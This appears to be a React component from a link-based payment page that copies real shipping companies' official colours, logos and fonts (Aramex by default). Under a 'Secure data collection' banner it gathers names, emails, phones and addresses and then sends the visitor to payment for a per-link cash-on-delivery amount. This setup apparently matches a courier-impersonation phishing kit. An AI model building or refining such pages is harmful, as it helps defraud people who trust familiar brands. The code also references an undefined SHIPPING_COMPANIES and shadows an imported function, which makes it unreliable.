import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getCompanyById, getAvailableCompanies, ShippingCompany } from "@/lib/shippingCompanies";
import { getCountryByCode, COUNTRIES } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import { useLink } from "@/hooks/useSupabase";
import { User, Mail, Phone, MapPin, ArrowLeft, Package } from "lucide-react";
import RecipientSenderToggle from "@/components/RecipientSenderToggle";
import { ThemeToggle } from "@/components/ThemeToggle";

const PaymentRecipientSender = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);

  const [dataType, setDataType] = useState<'recipient' | 'sender'>('recipient');
  const [selectedCountry, setSelectedCountry] = useState(linkData?.payload?.selectedCountry || 'SA');
  const [selectedCompany, setSelectedCompany] = useState(linkData?.payload?.service_key || 'aramex');

  const [formData, setFormData] = useState({
    name: "",
    email: "",
    phone: "",
    address: "",
    city: "",
    postalCode: "",
    company: "",
  });
  const [errors, setErrors] = useState<Record<string, string>>({});

  const countryData = getCountryByCode(selectedCountry);
  const companyData = getCompanyById(selectedCompany);
  const shippingInfo = linkData?.payload as any;

  // Get amount from link data
  const rawAmount = shippingInfo?.cod_amount || 500;
  const amount = typeof rawAmount === 'string' ? parseFloat(rawAmount) : rawAmount;
  const formattedAmount = formatCurrency(amount, countryData?.currency || 'SAR');

  const handleCountryChange = (countryCode: string) => {
    setSelectedCountry(countryCode);
    // Auto-select first available company for the country
    const availableCompanies = getAvailableCompanies(countryCode);
    if (availableCompanies.length > 0) {
      setSelectedCompany(availableCompanies[0].id);
    }
  };

  const getAvailableCompanies = (countryCode: string): ShippingCompany[] => {
    return Object.values(SHIPPING_COMPANIES).filter(
      (company) => company.countries.includes(countryCode) && company.isActive
    );
  };

  const validateForm = () => {
    const newErrors: Record<string, string> = {};

    if (!formData.name.trim()) {
      newErrors.name = `Please enter ${dataType === 'recipient' ? 'recipient' : 'sender'} name`;
    }

    if (!formData.email.trim()) {
      newErrors.email = "Please enter email address";
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) {
      newErrors.email = "Please enter a valid email address";
    }

    if (!formData.phone.trim()) {
      newErrors.phone = "Please enter phone number";
    }

    if (!formData.address.trim()) {
      newErrors.address = "Please enter address";
    }

    if (!formData.city.trim()) {
      newErrors.city = "Please enter city";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (validateForm()) {
      // Navigate to next step
      navigate(`/pay/${id}/details`);
    }
  };

  const handleInputChange = (field: string, value: string) => {
    setFormData({ ...formData, [field]: value });
    if (errors[field]) {
      setErrors({ ...errors, [field]: "" });
    }
  };

  const getCompanyStyles = () => {
    if (!companyData) {
      return {
        gradient: 'linear-gradient(135deg, #4D148C, #FF6600)',
        background: 'linear-gradient(180deg, #FFF 0%, #F5F0FF 100%)',
        primary: '#4D148C',
        secondary: '#FF6600',
        logo: '/logos/default-logo.svg',
        fontFamily: "'Inter', sans-serif",
      };
    }

    return {
      gradient: companyData.officialColors.gradient || `linear-gradient(135deg, ${companyData.officialColors.primary}, ${companyData.officialColors.secondary})`,
      background: 'linear-gradient(180deg, #FFF 0%, #F5F0FF 100%)',
      primary: companyData.officialColors.primary,
      secondary: companyData.officialColors.secondary,
      logo: companyData.logo,
      fontFamily: companyData.fontFamily,
    };
  };

  const styles = getCompanyStyles();

  const labels = {
    recipient: {
      title: `${dataType === 'recipient' ? 'Recipient' : 'Sender'} Information`,
      subtitle: `Enter ${dataType === 'recipient' ? 'the person who will receive' : 'the person who will send'} the shipment`,
      name: `${dataType === 'recipient' ? 'Recipient' : 'Sender'} Full Name`,
      address: `${dataType === 'recipient' ? 'Delivery' : 'Pickup'} Address`,
    },
    sender: {
      title: `${dataType === 'recipient' ? 'Recipient' : 'Sender'} Information`,
      subtitle: `Enter ${dataType === 'recipient' ? 'the person who will receive' : 'the person who will send'} the shipment`,
      name: `${dataType === 'recipient' ? 'Recipient' : 'Sender'} Full Name`,
      address: `${dataType === 'recipient' ? 'Delivery' : 'Pickup'} Address`,
    },
  };

  const currentLabels = labels[dataType];

  return (
    <div
      className="min-h-screen"
      style={{
        background: styles.background,
        fontFamily: styles.fontFamily,
      }}
    >
      {/* Header */}
      <header
        className="sticky top-0 z-50 w-full border-b bg-white shadow-sm"
      >
        <div className="container mx-auto px-4 h-16 sm:h-20 flex items-center justify-between">
          <div className="flex items-center gap-3 sm:gap-4">
            <button
              onClick={() => navigate(-1)}
              className="p-2 hover:bg-gray-100 rounded-full transition-colors"
            >
              <ArrowLeft className="w-5 h-5 text-gray-700" />
            </button>
            {styles.logo && (
              <img
                src={styles.logo}
                alt={companyData?.name || 'Company'}
                className="h-8 sm:h-12 w-auto object-contain"
                onError={(e) => {
                  (e.target as HTMLImageElement).style.display = 'none';
                }}
              />
            )}
          </div>
          <div className="flex items-center gap-2">
            <div className="text-right">
              <h1 className="text-lg sm:text-xl font-bold text-gray-900">
                {companyData?.name || 'Shipping'}
              </h1>
              <p className="text-xs sm:text-sm text-gray-600">
                Secure {dataType} data collection
              </p>
            </div>
            <ThemeToggle className="ml-2" />
          </div>
        </div>
        {/* Brand Bar */}
        <div
          className="h-1 w-full"
          style={{
            background: styles.gradient,
          }}
        />
      </header>

      {/* Main Content */}
      <main className="container mx-auto px-4 py-6 sm:py-8">
        <div className="max-w-2xl mx-auto space-y-6">
          {/* Data Type Toggle */}
          <div className="bg-white rounded-xl p-6 shadow-sm border border-gray-200">
            <h2 className="text-lg font-bold mb-4 text-gray-900">
              What information do you want to collect?
            </h2>
            <RecipientSenderToggle
              mode={dataType}
              onChange={setDataType}
            />
          </div>

          {/* Country and Company Selection */}
          <div className="bg-white rounded-xl p-6 shadow-sm border border-gray-200">
            <h2 className="text-lg font-bold mb-4 text-gray-900">
              Select Country & Shipping Company
            </h2>
            <div className="space-y-4">
              {/* Country Selection */}
              <div>
                <label className="block text-sm font-semibold mb-2 text-gray-700">
                  Country
                </label>
                <select
                  value={selectedCountry}
                  onChange={(e) => handleCountryChange(e.target.value)}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
                >
                  {COUNTRIES.map((country) => (
                    <option key={country.code} value={country.code}>
                      {country.flag} {country.name} ({country.currency})
                    </option>
                  ))}
                </select>
              </div>

              {/* Company Selection */}
              <div>
                <label className="block text-sm font-semibold mb-2 text-gray-700">
                  Shipping Company
                </label>
                <div className="grid grid-cols-1 gap-3">
                  {getAvailableCompanies(selectedCountry).map((company) => (
                    <label
                      key={company.id}
                      className={`
                        flex items-center gap-3 p-4 border-2 rounded-lg cursor-pointer transition-all hover:shadow-md
                        ${selectedCompany === company.id
                          ? 'border-blue-500 bg-blue-50'
                          : 'border-gray-200 hover:border-gray-300'
                        }
                      `}
                    >
                      <input
                        type="radio"
                        name="shippingCompany"
                        value={company.id}
                        checked={selectedCompany === company.id}
                        onChange={(e) => setSelectedCompany(e.target.value)}
                        className="w-5 h-5 text-blue-600"
                      />
                      <div className="flex-1">
                        <div className="font-bold text-sm text-gray-900">
                          {company.name}
                        </div>
                        <div className="text-xs text-gray-600">
                          {company.description}
                        </div>
                      </div>
                      <div className="flex gap-1">
                        <div
                          className="w-4 h-4 rounded"
                          style={{ backgroundColor: company.officialColors.primary }}
                        />
                        <div
                          className="w-4 h-4 rounded"
                          style={{ backgroundColor: company.officialColors.secondary }}
                        />
                      </div>
                    </label>
                  ))}
                </div>
              </div>
            </div>
          </div>

          {/* Form */}
          <form onSubmit={handleSubmit}>
            <div className="bg-white rounded-xl p-6 shadow-sm border border-gray-200">
              <h2 className="text-xl font-bold mb-2" style={{ color: styles.primary }}>
                {currentLabels.title}
              </h2>
              <p className="text-sm mb-6 text-gray-600">
                {currentLabels.subtitle}
              </p>

              <div className="space-y-5">
                {/* Name */}
                <div>
                  <label className="block text-sm font-semibold mb-2 text-gray-700">
                    {currentLabels.name}
                  </label>
                  <div className="relative">
                    <input
                      type="text"
                      placeholder="Enter full name"
                      value={formData.name}
                      onChange={(e) => handleInputChange('name', e.target.value)}
                      className={`w-full px-4 py-3 pl-12 border rounded-lg text-sm focus:outline-none focus:ring-2 ${
                        errors.name ? 'border-red-500 ring-red-200' : 'border-gray-300 focus:ring-blue-500'
                      }`}
                    />
                    <User
                      className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400"
                    />
                  </div>
                  {errors.name && (
                    <p className="text-xs mt-1 text-red-600">{errors.name}</p>
                  )}
                </div>

                {/* Email */}
                <div>
                  <label className="block text-sm font-semibold mb-2 text-gray-700">
                    Email Address
                  </label>
                  <div className="relative">
                    <input
                      type="email"
                      placeholder="example@email.com"
                      value={formData.email}
                      onChange={(e) => handleInputChange('email', e.target.value)}
                      className={`w-full px-4 py-3 pl-12 border rounded-lg text-sm focus:outline-none focus:ring-2 ${
                        errors.email ? 'border-red-500 ring-red-200' : 'border-gray-300 focus:ring-blue-500'
                      }`}
                    />
                    <Mail
                      className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400"
                    />
                  </div>
                  {errors.email && (
                    <p className="text-xs mt-1 text-red-600">{errors.email}</p>
                  )}
                </div>

                {/* Phone */}
                <div>
                  <label className="block text-sm font-semibold mb-2 text-gray-700">
                    Phone Number
                  </label>
                  <div className="relative">
                    <input
                      type="tel"
                      placeholder={countryData?.phonePlaceholder || "Phone number"}
                      value={formData.phone}
                      onChange={(e) => handleInputChange('phone', e.target.value)}
                      className={`w-full px-4 py-3 pl-12 border rounded-lg text-sm focus:outline-none focus:ring-2 ${
                        errors.phone ? 'border-red-500 ring-red-200' : 'border-gray-300 focus:ring-blue-500'
                      }`}
                    />
                    <Phone
                      className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400"
                    />
                  </div>
                  {errors.phone && (
                    <p className="text-xs mt-1 text-red-600">{errors.phone}</p>
                  )}
                </div>

                {/* Address */}
                <div>
                  <label className="block text-sm font-semibold mb-2 text-gray-700">
                    {currentLabels.address}
                  </label>
                  <div className="relative">
                    <textarea
                      placeholder="Enter full address"
                      value={formData.address}
                      onChange={(e) => handleInputChange('address', e.target.value)}
                      rows={3}
                      className={`w-full px-4 py-3 pl-12 border rounded-lg text-sm focus:outline-none focus:ring-2 resize-none ${
                        errors.address ? 'border-red-500 ring-red-200' : 'border-gray-300 focus:ring-blue-500'
                      }`}
                    />
                    <MapPin
                      className="absolute left-3 top-3 w-5 h-5 text-gray-400"
                    />
                  </div>
                  {errors.address && (
                    <p className="text-xs mt-1 text-red-600">{errors.address}</p>
                  )}
                </div>

                {/* City and Postal Code */}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-semibold mb-2 text-gray-700">
                      City
                    </label>
                    <input
                      type="text"
                      placeholder="Enter city"
                      value={formData.city}
                      onChange={(e) => handleInputChange('city', e.target.value)}
                      className={`w-full px-4 py-3 border rounded-lg text-sm focus:outline-none focus:ring-2 ${
                        errors.city ? 'border-red-500 ring-red-200' : 'border-gray-300 focus:ring-blue-500'
                      }`}
                    />
                    {errors.city && (
                      <p className="text-xs mt-1 text-red-600">{errors.city}</p>
                    )}
                  </div>

                  <div>
                    <label className="block text-sm font-semibold mb-2 text-gray-700">
                      Postal Code
                    </label>
                    <input
                      type="text"
                      placeholder="Enter postal code"
                      value={formData.postalCode}
                      onChange={(e) => handleInputChange('postalCode', e.target.value)}
                      className="w-full px-4 py-3 border border-gray-300 rounded-lg text-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
                    />
                  </div>
                </div>

                {/* Amount Display */}
                <div
                  className="flex items-center justify-between p-4 rounded-lg border mt-6"
                  style={{
                    backgroundColor: `${styles.primary}08`,
                    borderColor: styles.primary,
                  }}
                >
                  <div className="flex items-center gap-2">
                    <Package className="w-5 h-5" style={{ color: styles.primary }} />
                    <span className="text-base font-semibold text-gray-900">
                      Shipping Cost
                    </span>
                  </div>
                  <span
                    className="text-xl font-bold"
                    style={{ color: styles.primary }}
                  >
                    {formattedAmount}
                  </span>
                </div>
              </div>
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              className="w-full text-white font-bold py-4 sm:py-5 px-6 rounded-lg transition-all duration-300 hover:shadow-lg active:scale-[0.98] flex items-center justify-center gap-2 text-sm sm:text-base"
              style={{
                background: styles.gradient,
                fontFamily: styles.fontFamily,
              }}
            >
              <span>Continue to Payment</span>
              <ArrowLeft className="w-5 h-5" />
            </button>

            {/* Terms Notice */}
            <p className="text-xs text-center mt-4 text-gray-600">
              By continuing, you agree to our Terms and Conditions
            </p>
          </form>
        </div>
      </main>
    </div>
  );
};

export default PaymentRecipientSender;
